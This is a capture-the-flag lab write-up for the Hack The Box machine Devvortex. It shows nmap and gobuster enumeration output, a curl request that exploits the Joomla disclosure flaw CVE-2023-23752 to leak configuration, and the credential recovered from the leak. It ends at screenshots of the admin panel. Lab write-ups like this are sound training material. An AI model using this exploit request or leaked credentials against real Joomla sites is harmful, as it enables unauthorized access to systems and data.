# Devvortex Write-up

<img src="https://labs.hackthebox.com/storage/avatars/2565d292772abc4a2d774117cf4d36ff.png" width="200" height="200">

---------------------------------------------------------------------------------------------------------------------

## Nmap 

`nmap -sC -sV devvortex.htb`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
    |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
    |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-title: DevVortex
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Subdomain and directory enumeration 

#### Gobuster

I use wordlist `subdomains-top1million-20000.txt`. You need to install SecLists https://github.com/danielmiessler/SecLists

`gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -k`

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:             http://devvortex.htb
    [+] Method:          GET
    [+] Threads:         10
    [+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
    [+] User Agent:      gobuster/3.6
    [+] Timeout:         10s
    [+] Append Domain:   true
    ===============================================================
    Starting gobuster in VHOST enumeration mode
    ===============================================================
    Found: dev.devvortex.htb Status: 200 [Size: 23221]
    Progress: 19966 / 19967 (99.99%)
    ===============================================================
    Finished
    ===============================================================

Directory enumerations for dev subdomain

`gobuster dir -u http://dev.devvortex.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://dev.devvortex.htb/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
    /home                 (Status: 200) [Size: 23221]
    /media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
    /templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
    /modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
    /plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
    /includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
    /language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
    /components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
    /api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
    /cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
    /libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
    /tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
    /layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
    /administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
    /cli                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cli/]                                                       
    Progress: 87664 / 87665 (100.00%)
    ===============================================================
    Finished
    ===============================================================

![image](https://github.com/zer00d4y/writeups/assets/128820441/7203ec9b-fa4f-449d-b59f-1bdb030b8591)

#### CVE-2023-23752

`curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true`

![image](https://github.com/zer00d4y/writeups/assets/128820441/b72ce5f2-5931-4c2c-bbc5-3db0dc4b0376)

    lewis:P4ntherg0t1n5r3c0n##

![image](https://github.com/zer00d4y/writeups/assets/128820441/24711425-9456-47ee-b90b-41a1994b6b44)

![image](https://github.com/zer00d4y/writeups/assets/128820441/954a25aa-8759-42d0-9157-c2c8f26c75d5)

Systems -> Extensions

![image](https://github.com/zer00d4y/writeups/assets/128820441/e4cfe7ea-77bf-45b9-bff7-9f0ed98171de)

